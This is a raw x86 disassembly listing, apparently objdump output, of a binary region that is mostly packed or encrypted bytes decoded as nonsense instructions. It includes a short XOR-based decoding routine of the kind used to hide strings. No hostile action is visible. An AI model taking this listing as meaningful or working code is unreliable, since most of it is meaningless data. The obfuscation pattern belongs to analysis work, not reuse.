  4077dd:	cmp    al,0xcf
  4077df:	pop    es
  4077e0:	and    ah,BYTE PTR [eax]
  4077e2:	mov    bh,0x2c
  4077e4:	dec    esi
  4077e5:	add    eax,0x4b40593b
  4077ea:	pusha  
  4077eb:	pop    es
  4077ec:	cmp    bl,BYTE PTR [eax]
  4077ee:	rcl    BYTE PTR [ebp+0x7012fff3],cl
  4077f4:	cmp    DWORD PTR [ebx],0x24
  4077f7:	xchg   BYTE PTR [eax-0x7ccd7f08],dl
  4077fd:	popa   
  4077fe:	shr    BYTE PTR [ebx],1
  407800:	sub    edi,DWORD PTR [esi-0xbc0ccbd]
  407806:	sub    eax,0x9274ed1d
  40780b:	jae    0x4077cc
  40780d:	adc    dl,dl
  40780f:	je     0x407800
  407811:	jg     0x40784b
  407813:	call   0x1d92:0x77c9981e
  40781a:	ret    0x5529
  40781d:	test   al,0x9e
  40781f:	nop
  407820:	cmc    
  407821:	test   BYTE PTR [ebx+0x5e],al
  407824:	pusha  
  407825:	mov    ah,0x9e
  407827:	test   al,0x80
  407829:	test   eax,0x131acff8
  40782e:	pop    edi
  40782f:	je     0x40780d
  407831:	ds sbb bl,dl
  407834:	jno    0x4077ea
  407836:	dec    ecx
  407837:	jb     0x40783f
  407839:	into   
  40783a:	add    ebp,esp
  40783c:	mov    dl,0x52
  40783e:	xor    DWORD PTR [esi],esi
  407840:	mov    ds:0xe866aac3,eax
  407845:	or     bh,BYTE PTR [eax]
  407847:	mul    ebp
  407849:	stc    
  40784a:	fucomp st(6)
  40784c:	push   es
  40784d:	mov    ds:0xe7c390f5,eax
  407852:	xchg   DWORD PTR [edx+0x77a95edb],ebp
  407858:	jo     0x40789f
  40785a:	sub    eax,0xd3ccb6bc
  40785f:	xor    al,0x7
  407861:	iret   
  407862:	push   esp
  407863:	and    ebp,edi
  407865:	sub    al,0x69
  407867:	jmp    0x8ad5908c
  40786c:	xor    cl,al
  40786e:	push   edx
  40786f:	sub    ebp,DWORD PTR [edi+ebp*1-0x42]
  407873:	les    esi,FWORD PTR [ecx]
  407875:	cmp    cl,al
  407877:	dec    ebx
  407878:	bound  esp,QWORD PTR [ecx-0x22d92f2f]
  40787e:	or     DWORD PTR [esi+0x4167e7c2],ebp
  407884:	dec    ebx
  407885:	dec    edx
  407886:	pop    esp
  407887:	add    al,BYTE PTR ds:0x640b5eb2
  40788d:	(bad)  
  40788e:	es pop ebx
  407890:	add    ecx,ecx
  407892:	(bad)  
  407893:	fs in  eax,0xb9
  407896:	mov    esp,0x1afa4f06
  40789b:	in     eax,0xf4
  40789d:	xchg   ebx,eax
  40789e:	jmp    0x7cd7:0xc58cfe54
  4078a5:	retf   
  4078a6:	(bad)  
  4078a7:	adc    DWORD PTR [edi],esp
  4078a9:	mov    edx,eax
  4078ab:	inc    edx
  4078ac:	out    0xe8,ax
  4078af:	sti    
  4078b0:	shl    DWORD PTR [edi-0x2bbc8639],1
  4078b6:	jmp    0x67a0:0xac875dce
  4078bd:	enter  0xaf91,0xd4
  4078c1:	mov    esp,0xcd233610
  4078c6:	rol    DWORD PTR [esi+0x36f31f6a],cl
  4078cc:	xchg   ebx,eax
  4078cd:	sbb    eax,0xb985d233
  4078d2:	xlat   BYTE PTR ds:[ebx]
  4078d3:	inc    esp
  4078d4:	cmp    al,0x99
  4078d6:	(bad)  
  4078d7:	mov    gs,WORD PTR [edi+0x613722e2]
  4078dd:	cmp    bl,BYTE PTR [edi+0x6e]
  4078e0:	iret   
  4078e1:	adc    DWORD PTR [edi-0x5c],esi
  4078e4:	push   es
  4078e5:	and    DWORD PTR [edi],0x16c3e01d
  4078eb:	popa   
  4078ec:	pop    ebx
  4078ed:	and    esi,edi
  4078ef:	(bad)  [eax]
  4078f1:	jmp    0x4078cb
  4078f3:	rcr    BYTE PTR [ebp-0x5b6cc611],1
  4078f9:	pop    ebx
  4078fa:	lahf   
  4078fb:	jge    0x40791d
  4078fd:	pop    eax
  4078fe:	ret    
  4078ff:	into   
  407900:	es into 
  407902:	or     dl,BYTE PTR [ecx+0x4a]
  407905:	cmc    
  407906:	xchg   esi,eax
  407907:	cdq    
  407908:	out    dx,eax
  407909:	pop    ebp
  40790a:	aam    0xc0
  40790c:	jmp    FWORD PTR [eax-0x7974ca06]
  407912:	mov    dh,0x9f
  407914:	(bad)  
  407915:	lock call 0xf34e:0x2aa79e25
  40791d:	clc    
  40791e:	adc    eax,0xbf4609e5
  407923:	js     0x40790e
  407925:	xor    cl,BYTE PTR [esi+eax*2+0x1bc8fa7a]
  40792c:	std    
  40792d:	jmp    0x5e3b:0x4cb0
  407933:	mul    DWORD PTR [ebx]
  407935:	mov    ah,0x4a
  407937:	cld    
  407938:	fwait
  407939:	aam    0x15
  40793b:	daa    
  40793c:	push   cs
  40793d:	mov    esi,DWORD PTR [esp+ebx*4]
  407940:	push   esi
  407941:	adc    edx,eax
  407943:	pop    es
  407944:	jle    0x407947
  407946:	mov    dl,0x71
  407948:	out    0xc8,al
  40794a:	mov    edi,0xccfd7ab1
  40794f:	sub    eax,0x35dec9fc
  407954:	std    
  407955:	ss ins DWORD PTR es:[edi],dx
  407957:	stos   DWORD PTR es:[edi],eax
  407958:	retf   
  407959:	mov    edx,DWORD PTR ss:[ebx+0x64]
  40795d:	aad    0xbb
  40795f:	std    
  407960:	pop    edi
  407961:	jo     0x4079ae
  407963:	mov    al,ds:0xd4969792
  407968:	xor    DWORD PTR [edi+0x71],ebp
  40796b:	ret    
  40796c:	and    esp,ebx
  40796e:	mov    edx,0xf53caca3
  407973:	dec    edx
  407974:	daa    
  407975:	push   ecx
  407976:	cmp    bl,bh
  407978:	or     eax,0xd6672e73
  40797d:	pushf  
  40797e:	add    al,0x26
  407980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407981:	loopne 0x4079d8
  407983:	mov    esi,0x4c6f455a
  407988:	sar    ebx,cl
  40798a:	loope  0x40797e
  40798c:	imul   DWORD PTR [ebp-0x80]
  40798f:	cmc    
  407990:	mov    bh,0xc
  407992:	push   ebp
  407993:	and    ecx,DWORD PTR ss:[eax-0x8]
  407997:	in     eax,dx
  407998:	out    dx,al
  407999:	pusha  
  40799a:	aad    0x11
  40799c:	loopne 0x407933
  40799e:	pop    edx
  40799f:	dec    esi
  4079a0:	push   ds
  4079a1:	cdq    
  4079a2:	call   0x6e16:0x1c39aa35
  4079a9:	inc    esp
  4079aa:	sub    eax,0xd52b2ce8
  4079af:	retf   
  4079b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079b1:	mov    esp,0xb880f7ad
  4079b6:	mov    ecx,0xd617a324
  4079bb:	retf   0x572f
  4079be:	lahf   
  4079bf:	and    ecx,DWORD PTR [ebx-0x53]
  4079c2:	push   ecx
  4079c3:	dec    ecx
  4079c4:	jp     0x407a3d
  4079c6:	push   ebp
  4079c7:	sub    esi,DWORD PTR [ecx]
  4079c9:	adc    BYTE PTR [ebx+0x33],dh
  4079cc:	xor    eax,0x903c1e44
  4079d1:	fwait
  4079d2:	mov    eax,ds:0xaa57b9ef
  4079d7:	mov    DWORD PTR [ebx+0x2c0f6ec1],ebx
  4079dd:	out    0x6a,eax
  4079df:	add    dl,BYTE PTR [eax-0x68fae50f]
  4079e5:	adc    eax,0x8644572
  4079ea:	jno    0x4079cc
  4079ec:	jno    0x407a0e
  4079ee:	push   ds
  4079ef:	into   
  4079f0:	jae    0x4079b3
  4079f2:	jp     0x4079f4
  4079f4:	leave  
  4079f5:	outs   dx,BYTE PTR ds:[esi]
  4079f6:	jecxz  0x4079e1
  4079f8:	cmc    
  4079f9:	mov    edx,0x68d5faf5
  4079fe:	paddd  mm7,QWORD PTR [edx+0x49867c8]
  407a05:	mov    dl,0xaa
  407a07:	icebp  
  407a08:	scas   al,BYTE PTR es:[edi]
  407a09:	clc    
  407a0a:	mov    al,ds:0xb40e607c
  407a0f:	pop    eax
  407a10:	fidivr WORD PTR [esi+eax*2+0xced679f]
  407a17:	jne    0x4079fc
  407a19:	inc    ecx
  407a1a:	pop    ebp
  407a1b:	pushf  
  407a1c:	dec    eax
  407a1d:	fnsave [edx]
  407a1f:	add    esi,esi
  407a21:	mov    ebp,0x6912db0f
  407a26:	fnstcw WORD PTR [esi+0x742dd0b4]
  407a2c:	jmp    0x4079ce
  407a2e:	es cs lock inc eax
  407a32:	adc    DWORD PTR [ebx-0xc],ebp
  407a35:	jle    0x407a1f
  407a37:	mov    BYTE PTR [esi+ecx*1],dh
  407a3a:	daa    
  407a3b:	mov    BYTE PTR [edi+0x2e],0x26
  407a3f:	sbb    ebx,esi
  407a41:	add    eax,0x6384263d
  407a46:	aad    0xa7
  407a48:	and    DWORD PTR [esi],eax
  407a4a:	int    0x4e
  407a4c:	push   0x34b06aa3
  407a51:	mov    dh,0x73
  407a53:	xchg   edx,eax
  407a54:	dec    ecx
  407a55:	xchg   ebp,eax
  407a56:	outs   dx,DWORD PTR ds:[esi]
  407a57:	repz loope 0x407aad
  407a5a:	out    dx,eax
  407a5b:	out    0xfd,eax
  407a5d:	shl    BYTE PTR [ebp-0x51b3ce53],cl
  407a63:	xchg   ebp,eax
  407a64:	(bad)  
  407a65:	leave  
  407a66:	add    cl,bl
  407a68:	popa   
  407a69:	lock jmp 0x407a06
  407a6c:	xor    eax,0x5506dcc2
  407a71:	leave  
  407a72:	sbb    DWORD PTR [eax],esp
  407a74:	jno    0x407a2d
  407a76:	inc    ebp
  407a77:	sub    ch,BYTE PTR [esi-0x20]
  407a7a:	sbb    ecx,DWORD PTR [edi-0x5]
  407a7d:	ins    BYTE PTR es:[edi],dx
  407a7e:	fnstsw WORD PTR [ecx]
  407a80:	bound  edx,QWORD PTR [esi-0x3f]
  407a83:	xchg   DWORD PTR [eax-0xe25de29],esi
  407a89:	ins    BYTE PTR es:[edi],dx
  407a8a:	push   esi
  407a8b:	je     0x407a90
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac1:	mov    BYTE PTR [eax+ebp*2-0x64],bh
  407ac5:	fstp   TBYTE PTR [eax+0x78]
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407b1a
  407acd:	leave  
  407ace:	inc    edi
  407acf:	xchg   ebx,eax
  407ad0:	dec    eax
  407ad1:	mov    BYTE PTR [esi-0x30cbb157],bh
  407ad7:	inc    ecx
  407ad8:	mov    ebx,ss
  407ada:	nop
  407adb:	cwde   
  407adc:	neg    BYTE PTR ds:0xa8572214
  407ae2:	sub    al,0x32
  407ae4:	rol    esp,0x91
  407ae7:	arpl   bx,sp
  407ae9:	es arpl sp,bx
  407aec:	xchg   ebp,eax
  407aed:	rcl    BYTE PTR [edi-0x549ae05e],0xd6
  407af4:	iret   
  407af5:	cmp    bh,ah
  407af7:	dec    eax
  407af8:	and    edx,esi
  407afa:	cs loopne 0x407a9a
  407afd:	inc    esp
  407afe:	(bad)  [ecx-0x6f743c89]
  407b04:	cmp    eax,0x89b29c3c
  407b09:	or     cl,BYTE PTR [edi]
  407b0b:	cmp    edi,DWORD PTR [esi+edx*4+0x23]
  407b0f:	xchg   esi,eax
  407b10:	pop    eax
  407b11:	adc    DWORD PTR [edi+0x3f],esi
  407b14:	pop    ecx
  407b15:	jno    0x407b3c
  407b17:	inc    edi
  407b18:	mov    esp,esp
  407b1a:	lea    ebx,[ecx+0x26]
  407b1d:	arpl   WORD PTR [eax+0x72bd1227],cx
  407b23:	jns    0x407b40
  407b25:	test   DWORD PTR [ebx],ecx
  407b27:	push   ebx
  407b28:	jne    0x407ad9
  407b2a:	mov    DWORD PTR [esi+ecx*1+0x1e],ebp
  407b2e:	jns    0x407b58
  407b30:	lods   eax,DWORD PTR ds:[esi]
  407b31:	pop    esi
  407b32:	and    eax,0xf9d88198
  407b37:	cld    
  407b38:	iret   
  407b39:	fdiv   QWORD PTR [eax]
  407b3b:	add    BYTE PTR [edx],ah
  407b3d:	test   ch,bh
  407b3f:	mov    ?,ebp
  407b41:	pop    ebp
  407b42:	dec    eax
  407b43:	fs dec esp
  407b45:	or     al,0x32
  407b47:	(bad)  
  407b48:	shl    DWORD PTR [eax-0x39],cl
  407b4b:	imul   ebp,DWORD PTR [eax+0x35646e96],0xb56a9e04
  407b55:	add    DWORD PTR [ecx-0x572f2d1d],0x38e62a49
  407b5f:	jbe    0x407b9f
  407b61:	inc    edx
  407b62:	xchg   esp,eax
  407b64:	test   al,0x53
  407b66:	aaa    
  407b67:	scas   eax,DWORD PTR es:[edi]
  407b68:	add    bl,BYTE PTR ds:[edi+0x2a99ab26]
  407b6f:	cmp    ah,al
  407b71:	mov    ax,0x4b61
  407b75:	pop    ss
  407b76:	dec    eax
  407b77:	imul   esp,DWORD PTR [ebx-0x20],0x78
  407b7b:	test   BYTE PTR [ebp-0x4fad53ee],dh
  407b81:	clc    
  407b82:	mov    bl,0x8e
  407b84:	sbb    ebp,DWORD PTR [ebx+0x5b0b5416]
  407b8a:	in     eax,dx
  407b8b:	push   ds
  407b8c:	mov    esp,?
  407b8e:	fcom   DWORD PTR [esi-0x3ea6e1af]
  407b94:	mov    eax,ds:0x3a8761ef
  407b99:	push   ss
  407b9a:	das    
  407b9b:	scas   al,BYTE PTR es:[edi]
  407b9c:	fld    DWORD PTR [edx-0xf9d46e]
  407ba2:	mov    ds:0xe4419af9,eax
  407ba7:	daa    
  407ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ba9:	or     cl,BYTE PTR [esi]
  407bab:	mov    bh,0x20
  407bad:	sbb    BYTE PTR [eax],0x91
  407bb0:	xchg   ebp,eax
  407bb1:	adc    dh,ah
  407bb3:	mov    cs,WORD PTR [eax]
  407bb5:	pop    ebp
  407bb6:	jo     0x407c1f
  407bb8:	sahf   
  407bb9:	mov    eax,ds:0xa69a896c
  407bbe:	sub    dl,BYTE PTR [ecx-0x1147fdb4]
  407bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc5:	adc    ebx,edx
  407bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc8:	stc    
  407bc9:	pop    es
  407bca:	pop    ds
  407bcb:	sbb    BYTE PTR [esi+0x79],dh
  407bce:	lock rcr BYTE PTR [edi-0x18],0xe5
  407bd3:	lock hlt 
  407bd5:	in     al,dx
  407bd6:	dec    BYTE PTR [ebp+edi*1+0x4b96827d]
  407bdd:	clc    
  407bde:	dec    eax
  407bdf:	enter  0xfe5d,0xba
  407be3:	cmp    BYTE PTR [ecx-0x3203421a],0x8b
  407bea:	loop   0x407bc6
  407bec:	stos   BYTE PTR es:[edi],al
  407bed:	cmp    edi,edx
  407bef:	imul   ebp,DWORD PTR [ecx],0xb3c0d4eb
  407bf5:	(bad)  
  407bf6:	fwait
  407bf7:	hlt    
  407bf8:	dec    eax
  407bf9:	add    eax,0xdd168841
  407bfe:	and    BYTE PTR [edi],ch
  407c00:	in     eax,0x40
  407c02:	push   cs
  407c03:	and    bh,BYTE PTR [eax]
  407c05:	pop    edi
  407c06:	mov    dh,0x87
  407c08:	pop    edi
  407c09:	ficom  DWORD PTR [ebx-0x54]
  407c0c:	jmp    0x1c66:0xe8f3daf6
  407c13:	rcr    dl,0xe
  407c16:	or     ebp,ebp
  407c18:	repnz cmp eax,0xffffffca
  407c1c:	fdiv   DWORD PTR [esi]
  407c1e:	mov    cl,0x99
  407c20:	aam    0xf9
  407c22:	and    dh,ch
  407c24:	dec    eax
  407c25:	psraw  mm1,QWORD PTR [eax]
  407c28:	add    al,0x3a
  407c2a:	stos   BYTE PTR es:[edi],al
  407c2b:	xchg   edi,eax
  407c2c:	stos   BYTE PTR es:[edi],al
  407c2d:	xchg   si,ax
  407c2f:	pop    ebx
  407c30:	ja     0x407c2d
  407c32:	mul    BYTE PTR [esi-0x1f]
  407c35:	mov    ah,BYTE PTR [edx-0x658851e1]
  407c3b:	cdq    
  407c3c:	xchg   edi,eax
  407c3d:	(bad)  [edx-0x3bdde73c]
  407c43:	adc    cl,BYTE PTR [edi]
  407c45:	adc    BYTE PTR [eax+ebx*1],al
  407c48:	mov    ecx,0xd0290261
  407c4d:	adc    dl,BYTE PTR [ebp-0x63bac6ed]
  407c53:	das    
  407c54:	jae    0x407c92
  407c56:	enter  0x6c0f,0x40
  407c5a:	mov    WORD PTR [ecx],es
  407c5c:	cmp    DWORD PTR ds:0x4133c40e,edi
  407c62:	sbb    eax,0xafe471b4
  407c67:	jbe    0x407c5a
  407c69:	xor    al,0x69
  407c6b:	les    esp,FWORD PTR [esi-0x2]
  407c6e:	ss ds dec ebx
  407c71:	jbe    0x407c99
  407c73:	inc    esp
  407c74:	xchg   BYTE PTR [ebx],cl
  407c76:	xor    dh,dh
  407c78:	(bad)  
  407c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7a:	or     DWORD PTR [ebp-0x638907ba],edi
  407c80:	outs   dx,BYTE PTR ds:[esi]
  407c81:	xchg   ebp,eax
  407c82:	or     BYTE PTR [ecx],cl
  407c84:	es mov eax,0xb182dc4d
  407c8a:	dec    esi
  407c8b:	xlat   BYTE PTR ds:[ebx]
  407c8c:	push   ecx
  407c8d:	lock and al,0xfd
  407c90:	and    DWORD PTR [esi+0x6ab1bd64],0xd
  407c97:	rol    BYTE PTR [eax+0x42],cl
  407c9a:	cmp    BYTE PTR [ecx+edx*1-0x42dd89fd],ch
  407ca1:	aad    0x8f
  407ca3:	mov    edi,0xa6860194
  407ca8:	inc    ebx
  407ca9:	idiv   DWORD PTR [ebx]
  407cab:	mov    eax,ds:0x982df6df
  407cb0:	cmp    DWORD PTR [edx],ebx
  407cb2:	pop    ecx
  407cb3:	je     0x407c46
  407cb5:	rol    DWORD PTR [ecx],0x37
  407cb8:	clc    
  407cb9:	mov    esi,0x541348e4
  407cbe:	in     al,0x9a
  407cc0:	mov    ds:0x860d41ca,al
  407cc5:	adc    DWORD PTR [eax-0x5bb193ea],0xcce76bd5
  407ccf:	lahf   
  407cd0:	push   ss
  407cd1:	push   edi
  407cd2:	in     eax,0x6
  407cd4:	dec    esp
  407cd5:	mov    esp,0x1f32bfcf
  407cda:	mov    edi,0x11b7cf71
  407cdf:	sbb    eax,DWORD PTR [ebp-0x6b4880a4]
  407ce5:	mov    dl,0x9f
  407ce7:	(bad)  
  407ce8:	push   ds
  407ce9:	test   eax,0x54bdd29
  407cee:	jmp    0x28bb:0x438fb284
  407cf5:	mov    bl,BYTE PTR [eax-0x70]
  407cf8:	pop    es
  407cf9:	xor    dh,dl
  407cfb:	arpl   sp,bx
  407cfd:	adc    al,0xe7
  407cff:	pop    eax
  407d00:	imul   eax,edx,0x1a
  407d03:	sbb    al,0xd1
  407d05:	mov    cl,0xfc
  407d07:	pop    esi
  407d08:	cli    
  407d09:	popa   
  407d0a:	loopne 0x407c9c
  407d0c:	in     al,dx
  407d0d:	cmp    cl,BYTE PTR [edx+0x7c1068ec]
  407d13:	mov    ebx,0x26dc6164
  407d18:	add    eax,DWORD PTR [esi-0x21]
  407d1b:	mov    ecx,0x9a4c3a5
  407d20:	mov    eax,ds:0x8e54e597
  407d25:	out    dx,al
  407d26:	jle    0x407d41
  407d28:	jns    0x407d34
  407d2a:	stos   BYTE PTR es:[edi],al
  407d2b:	fst    DWORD PTR [esi-0x2a]
  407d2e:	mov    eax,ds:0x8161c04
  407d33:	cdq    
  407d34:	mov    cl,BYTE PTR [ecx-0x4ddb6759]
  407d3a:	push   eax
  407d3b:	fadd   DWORD PTR [esi]
  407d3d:	scas   al,BYTE PTR es:[edi]
  407d3e:	adc    al,BYTE PTR [ecx-0x8]
  407d41:	ss and ecx,ebx
  407d44:	inc    ecx
  407d45:	dec    ecx
  407d46:	pop    ds
  407d47:	in     al,dx
  407d48:	add    BYTE PTR [esi+edx*4],bh
  407d4b:	xchg   ebp,eax
  407d4c:	sub    sp,sp
  407d4f:	js     0x407d72
  407d51:	dec    edi
  407d52:	cmp    edi,0xa1665b39
  407d58:	push   edx
  407d59:	call   0xce2d:0x8c163c14
  407d60:	jbe    0x407d03
  407d62:	sbb    bl,BYTE PTR [esi+eiz*2]
  407d65:	push   0xfffffffc
  407d67:	call   0xff2f:0x4df440da
  407d6e:	scas   al,BYTE PTR es:[edi]
  407d6f:	gs scas al,BYTE PTR es:[edi]
  407d71:	adc    esp,DWORD PTR [edx]
  407d73:	out    dx,al
  407d74:	cmp    dl,ah
  407d76:	push   edi
  407d77:	test   eax,0x838a5b0e
  407d7c:	in     al,0xea
  407d7e:	cli    
  407d7f:	mov    esi,0xdb21fe8b
  407d84:	std    
  407d85:	dec    edi
  407d86:	add    DWORD PTR [ecx],esi
  407d88:	jbe    0x407d72
  407d8a:	mov    eax,ds:0x2f75738
  407d8f:	shl    edx,1
  407d91:	inc    edx
  407d92:	dec    edx
  407d93:	aaa    
  407d94:	pop    esi
  407d95:	shl    ebx,cl
  407d97:	jae    0x407e15
  407d99:	jp     0x407dac
  407d9b:	jle    0x407d36
  407d9d:	and    DWORD PTR [ebx-0x3ee71fe2],edx
  407da3:	jl     0x407db0
  407da5:	cs js  0x407dca
  407da8:	cdq    
  407da9:	mov    al,ds:0xfc4ac2f2
  407dae:	rcr    DWORD PTR [edi+0xe],cl
  407db1:	ret    
  407db2:	push   ecx
  407db3:	shr    DWORD PTR [ebx],cl
  407db5:	leave  
  407db6:	mov    ah,0x84
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fmul   st,st(7)
  407dda:	sub    al,0xe
  407ddc:	leave  
  407ddd:	mov    al,bl
  407ddf:	js     0x407e59
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407e2c
  407de6:	mov    ebp,DWORD PTR [ecx-0x2f0798cd]
  407dec:	push   esi
  407ded:	cmc    
  407dee:	jmp    0x407e0f
  407df0:	or     BYTE PTR [eax-0x771d6443],dl
  407df6:	inc    esi
  407df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407df8:	and    eax,0x16
  407dfb:	inc    edx
  407dfc:	xor    BYTE PTR [edi],0x44
  407dff:	repz pushf 
  407e01:	xor    eax,0x96124033
  407e06:	pop    eax
  407e07:	stos   DWORD PTR es:[edi],eax
  407e08:	(bad)  
  407e09:	mov    ebx,0x348b807e
  407e0e:	xchg   esp,eax
  407e0f:	inc    eax
  407e10:	fldenv [ecx]
  407e12:	dec    edi
  407e13:	ins    DWORD PTR es:[edi],dx
  407e14:	test   ebx,ebx
  407e16:	ror    DWORD PTR [ecx+0x12],1
  407e19:	mov    bl,0x6
  407e1b:	out    0x3e,eax
  407e1d:	dec    edx
  407e1e:	or     cl,dl
  407e20:	jns    0x407dbf
  407e22:	cli    
  407e23:	shr    DWORD PTR [ecx-0x48],0x17
  407e27:	and    eax,0x4271a24d
  407e2c:	dec    esi
  407e2d:	dec    edx
  407e2e:	call   DWORD PTR [esi]
  407e30:	bound  esp,QWORD PTR [edx]
  407e32:	or     bl,BYTE PTR [eax-0x71212b40]
  407e38:	and    BYTE PTR [edi+0x2cbbb500],bl
  407e3e:	mov    edx,0x63424ba4
  407e43:	jae    0x407e98
  407e45:	cmp    edx,DWORD PTR [eax-0x434a0726]
  407e4b:	mov    esi,0xfdf77528
  407e50:	shl    BYTE PTR [ebp+0x2e7c6657],cl
  407e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e57:	in     al,dx
  407e58:	xchg   esi,eax
  407e59:	jb     0x407e84
  407e5b:	xor    esp,edi
  407e5d:	fld    QWORD PTR [ebx-0xd811b41]
  407e63:	cmp    dh,BYTE PTR ds:0xa79e8c57
  407e69:	neg    DWORD PTR [ecx+ebp*2]
  407e6c:	cs into 
  407e6e:	iret   
  407e6f:	pop    esi
  407e70:	xor    esi,0xe2b764a2
  407e76:	dec    edx
  407e77:	lea    ebx,[ecx]
  407e79:	mov    ebx,0x8a56acb7
  407e7e:	jnp    0x407e95
  407e80:	adc    edx,ecx
  407e82:	mov    esp,0xd62ede21
  407e87:	mov    al,0x3a
  407e89:	popf   
  407e8a:	lock dec ebp
  407e8c:	sbb    BYTE PTR [ebx],ah
  407e8e:	sar    DWORD PTR ds:[ecx],cl
  407e91:	scas   eax,DWORD PTR es:[edi]
  407e92:	and    BYTE PTR [ecx-0x26],dl
  407e95:	loopne 0x407e42
  407e97:	out    dx,al
  407e98:	shl    DWORD PTR [esi+edi*2+0x5256261d],1
  407e9f:	sub    al,0x31
  407ea1:	pop    esp
  407ea2:	shr    DWORD PTR [ebp-0x5f892354],1
  407ea8:	ja     0x407f18
  407eaa:	inc    ebx
  407eab:	(bad)  
  407eac:	lahf   
  407ead:	repz sub DWORD PTR [ecx+0x5b],0xffffffca
  407eb2:	pop    ds
  407eb3:	sahf   
  407eb4:	stc    
  407eb5:	pop    ds
  407eb6:	hlt    
  407eb7:	in     al,dx
  407eb8:	icebp  
  407eb9:	jne    0x407f00
  407ebb:	lods   al,BYTE PTR ds:[esi]
  407ebc:	or     dh,cl
  407ebe:	shr    dl,cl
  407ec0:	fadd   QWORD PTR ds:0xa7bdb4b8
  407ec6:	lock (bad) 
  407ec8:	adc    edi,ecx
  407eca:	cmp    BYTE PTR [edi+0x4cf49b08],ah
  407ed0:	dec    eax
  407ed1:	mov    al,ds:0xd938a70d
  407ed6:	(bad)  
  407ed7:	cmp    BYTE PTR [eax+edx*1+0x229eb37b],ch
  407ede:	cmp    al,0xf9
  407ee0:	arpl   WORD PTR [eax],si
  407ee2:	or     edi,0xcd07d812
  407ee8:	fucom  st(6)
  407eea:	pop    edi
  407eeb:	sti    
  407eec:	adc    ebp,DWORD PTR [ecx-0x39]
  407eef:	mov    ebp,0x6cb55155
  407ef4:	ficom  WORD PTR [ecx]
  407ef6:	data16 sahf 
  407ef8:	test   eax,0x6dadec1b
  407efd:	cwde   
  407efe:	fist   DWORD PTR ds:0x63ebe56f
  407f04:	mov    eax,0x8da56058
  407f09:	outs   dx,BYTE PTR ds:[esi]
  407f0a:	mov    ebx,0x9833037e
  407f0f:	mov    DWORD PTR [ebp-0x51],ebp
  407f12:	jl     0x407f48
  407f14:	lods   eax,DWORD PTR ds:[esi]
  407f15:	mov    ah,0x6c
  407f17:	lock icebp 
  407f19:	scas   al,BYTE PTR es:[edi]
  407f1a:	fstp   DWORD PTR [eax]
  407f1c:	loope  0x407ee1
  407f1e:	adc    edx,DWORD PTR [eax-0x6a]
  407f21:	jae    0x407ee6
  407f23:	rcr    DWORD PTR [edx+0x14],1
  407f26:	aaa    
  407f27:	dec    esi
  407f28:	adc    bh,BYTE PTR [edx+0x45d14d88]
  407f2e:	inc    eax
  407f2f:	pop    es
  407f30:	les    esp,FWORD PTR [edi+ebx*4-0x25]
  407f34:	inc    edx
  407f35:	pushf  
  407f36:	shr    cl,cl
  407f38:	in     al,0x71
  407f3a:	pop    ss
  407f3b:	rcr    BYTE PTR [edx+0x55],cl
  407f3e:	lea    ecx,[esi+edi*1]
  407f41:	push   0xc36940d5
  407f46:	lea    esp,ds:0x3b4befab
  407f4c:	fidiv  DWORD PTR [edx]
  407f4e:	imul   edi,DWORD PTR [eax*8-0x1f41d33e],0xa152dee7
  407f59:	sbb    eax,0x1348025c
  407f5e:	fisub  DWORD PTR ds:0x5ef3f999
  407f64:	adc    eax,0x3186917b
  407f69:	pop    ss
  407f6a:	repz jne 0x407f77
  407f6d:	xchg   ecx,eax
  407f6e:	stc    
  407f6f:	or     dh,BYTE PTR [esi-0x7931e019]
  407f75:	or     eax,edx
  407f77:	stc    
  407f78:	pop    DWORD PTR ds:0xa26c47f4
  407f7e:	add    al,BYTE PTR ds:0xa0d7512a
  407f84:	push   es
  407f85:	mov    ds:0xab480482,al
  407f8a:	pop    ebx
  407f8b:	and    eax,0xc79e058a
  407f90:	inc    edi
  407f91:	jge    0x407f98
  407f93:	mov    bl,0x3f
  407f95:	fisub  WORD PTR [edx-0x7848dd20]
  407f9b:	add    eax,0xeee929b6
  407fa0:	add    eax,DWORD PTR [edx+0x14]
  407fa3:	pusha  
  407fa4:	sbb    eax,0x5217174e
  407fa9:	neg    WORD PTR [ebp+0x63]
  407fad:	pop    ecx
  407fae:	shl    DWORD PTR [edi+eax*4-0x419e7f6c],1
  407fb5:	fucom  st(3)
  407fb7:	pop    esp
  407fb8:	ss jecxz 0x407fc5
  407fbb:	inc    edi
  407fbc:	dec    edx
  407fbd:	and    bl,BYTE PTR [eax]
  407fbf:	mov    dh,0xa4
  407fc1:	js     0x408030
  407fc3:	stos   DWORD PTR es:[edi],eax
  407fc4:	stos   DWORD PTR es:[edi],eax
  407fc5:	mov    ah,0x26
  407fc7:	mov    ebp,0x4aa93599
  407fcc:	xchg   edx,eax
